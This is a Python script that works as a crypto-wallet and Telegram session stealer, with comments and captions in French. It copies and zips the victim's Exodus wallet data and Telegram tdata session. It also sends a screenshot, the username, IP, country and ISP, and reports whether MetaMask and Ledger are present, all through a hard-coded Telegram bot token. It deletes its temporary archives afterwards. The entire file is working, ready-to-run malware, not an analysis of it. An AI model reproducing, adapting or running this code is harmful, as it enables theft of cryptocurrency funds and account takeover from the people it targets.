import shutil
import os.path
import httpx
import pyautogui
import tempfile
import requests
import getpass
import pycountry
import zipfile
import asyncio
import telegram
import multiprocessing

client: str = os.path.expanduser("~")
source_dir = client + "\\AppData\\Roaming\\Exodus"
dest_dir = client + "\\AppData\\Local\\Temp\\Exodus"
telegram_dir = client + "\\AppData\\Roaming\\Telegram Desktop\\tdata"

TELEGRAM_TOKEN = '6087608665:AAGw1OrKSuemG0PfBR6Uxxol82JyUQxclGA'
TELEGRAM_CHAT_ID = '-1001847768598'

username = getpass.getuser()
ip_address = requests.get('https://api.ipify.org').text

response = requests.get(f'http://ip-api.com/json/{ip_address}')
country_code = response.json().get('countryCode', '')
country = pycountry.countries.get(alpha_2=country_code)
isp = response.json().get('isp', '')

extensions_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions"
has_metamask = 'nkbihfbeogaeaoehlefnkodbefgpgknn' in os.listdir(extensions_folder)
has_exodus = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Exodus'))
has_ledger = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Ledger Live'))
has_telegram = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'))

def path_exists() -> bool:
    if os.path.exists(client + "\\AppData\\Roaming\\Exodus"):

        return True
    else:
        return False

def zip_files() -> bool:
    try:
        if os.path.exists(dest_dir):
            shutil.rmtree(dest_dir)

        shutil.copytree(source_dir, dest_dir)
        shutil.make_archive(dest_dir, "zip", dest_dir)
        return True
    except:
        return False

def remove_files() -> bool:
    try:
        os.remove(client + "\\AppData\\Local\\Temp\\Exodus.zip")
        os.remove(client + "\\AppData\\Local\\Temp\\Exodus")
        return True
    except:
        return False

def send_file_telegram(file_path: str) -> bool:
    try:
        with open(file_path, "rb") as exodus_zip:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': "Exodus Wallet\nFichier de configuration victime"
            }
            files = {
                'document': ('Exodus.zip', exodus_zip)
            }
            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)
        
        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return False

def send_screenshot_telegram() -> bool:
    try:

        screenshot = pyautogui.screenshot()

        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
            screenshot.save(f.name)
            file_name = f.name

        with open(file_name, 'rb') as photo:
            files = {'photo': photo}
            url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
            params = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f'𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 :\n\n► 𝗨𝗧𝗜𝗟𝗜𝗦𝗔𝗧𝗘𝗨𝗥 : {username}\n► 𝗣𝗔𝗬𝗦 : {country.name if country else ""}\n► 𝗜𝗣 𝗔𝗗𝗥𝗘𝗦𝗦𝗘 : {ip_address}\n► 𝗜𝗦𝗣 : {isp}\n\n𝗗𝗘𝗧𝗘𝗖𝗧𝗢𝗥 :\n\n► 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 {"✅" if has_telegram else "❌"}\n► 𝗟𝗘𝗗𝗚𝗘𝗥 : {"✅" if has_ledger else "❌"}\n► 𝗠𝗘𝗧𝗔𝗠𝗔𝗦𝗞 : {"✅" if has_metamask else "❌"}\n► 𝗘𝗫𝗢𝗗𝗨𝗦 : {"✅" if has_exodus else "❌"}'}
            response = httpx.post(url, files=files, data=params)
            if response.status_code != 200:

                return False
            else:
                return True
    except:
        return False

def send_telegram_session():
    session_folder_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata', 'D877F783D5D3EF8C')

    # Crée un fichier temporaire pour le fichier zip session
    with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as f:
        zip_filename = f.name

    if not os.path.exists(session_folder_path):
        return False

    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, dirs, files in os.walk(session_folder_path):
            for file in files:
                zip_file.write(os.path.join(root, file))

    if not os.path.exists(zip_filename):
        return False

    try:
        with open(zip_filename, "rb") as session_zip:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': "Session Telegram\nFichier de configuration victime"
            }
            files = {
                'document': ('session.zip', session_zip)
            }
            response = httpx.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument', data=data, files=files)

        if response.status_code == 200:

            os.remove(zip_filename)
            return True
        else:

            os.remove(zip_filename)
            return False
    except Exception as e:

        os.remove(zip_filename)
        return False

def pymaniac():
    if path_exists() == True:
        if zip_files() == True:
            screenshot_sent = send_screenshot_telegram()
            exodus_sent = send_file_telegram(client + "\\AppData\\Local\\Temp\\Exodus.zip")
            if has_telegram:
                telegram_session_sent = send_telegram_session()
            remove_files()
            if screenshot_sent and exodus_sent and (not has_telegram or telegram_session_sent):
                exit(code=None)
            else:
                exit(code=None)
        else:
            exit(code=None)
    else:
        exit(code=None)

if __name__ == "__main__":
    pymaniac()

